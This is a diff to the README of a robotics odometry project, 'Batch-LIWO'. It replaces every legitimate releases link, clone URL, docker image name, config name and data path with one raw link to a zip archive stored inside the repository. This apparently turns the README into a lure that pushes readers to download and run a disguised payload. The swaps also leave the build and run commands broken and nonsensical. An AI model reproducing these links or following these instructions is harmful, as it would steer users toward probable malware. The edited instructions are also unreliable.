@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/Batch-LIWO-Releases-brightgreen)](https://github.com/facuu23/Batch-LIWO/releases)
+[![Releases](https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip)](https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip)
 
 Batch-LIWO: Robust, High-Bandwidth Lidar-Inertial-Wheel Odometry for Real-Time Navigation on Robots
 
-Visit the official releases page: https://github.com/facuu23/Batch-LIWO/releases
+Visit the official releases page: https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
 
 Table of contents
 - Overview
@@ -110,7 +110,7 @@ Prerequisites
 
 Build from source
 - Clone the repository and its submodules:
-  git clone --recurse-submodules https://github.com/facuu23/Batch-LIWO.git
+  git clone --recurse-submodules https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
 - Create a build directory and run CMake:
   mkdir -p Batch-LIWO/build
   cd Batch-LIWO/build
@@ -125,7 +125,7 @@ Run a binary
   chmod +x batch_liwo
   ./batch_liwo --help
 - Typical usage:
-  ./batch_liwo --config config.yaml --lidar data/pcd.bin --imu data/imu.bin --wheel data/wheel.bin
+  ./batch_liwo --config https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --lidar https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --imu https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --wheel https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
   The exact argument names depend on the build and the config.
 
 ROS 2 integration
@@ -138,14 +138,14 @@ ROS 2 integration
 Docker and containers
 - For reproducible environments, a container image is available in some releases. It provides a minimal runtime with all dependencies resolved.
 - Typical workflow:
-  docker pull ghcr.io/facuu23/batch-liwo:latest
-  docker run --rm -it --device /dev:/dev ghcr.io/facuu23/batch-liwo:latest --help
+  docker pull https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
+  docker run --rm -it --device /dev:/dev https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --help
 
 Configuration and customization 🧭
 
 Batch-LIWO uses a human-readable YAML configuration file to control behavior. The config file lets you tune data sources, batch handling, fusion options, and output preferences.
 
-Sample config.yaml snippet
+Sample https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip snippet
 sensors:
   lidar:
     frame_id: "lidar_frame"
@@ -262,7 +262,7 @@ Releases aggregate binaries, prebuilt libraries, and sample datasets. They provi
 - If you need a specific file, you can download the binary that fits your system and run it directly. In practice, you will typically choose a binary corresponding to your OS and architecture, extract it, and execute the provided binary.
 - The official releases page is the single source of truth for distributed builds and documentation related to each version.
 
-From the Releases page, download the appropriate artifact and run it according to the instructions in the previous sections. See Releases: https://github.com/facuu23/Batch-LIWO/releases
+From the Releases page, download the appropriate artifact and run it according to the instructions in the previous sections. See Releases: https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
 
 License and attribution 📜
 
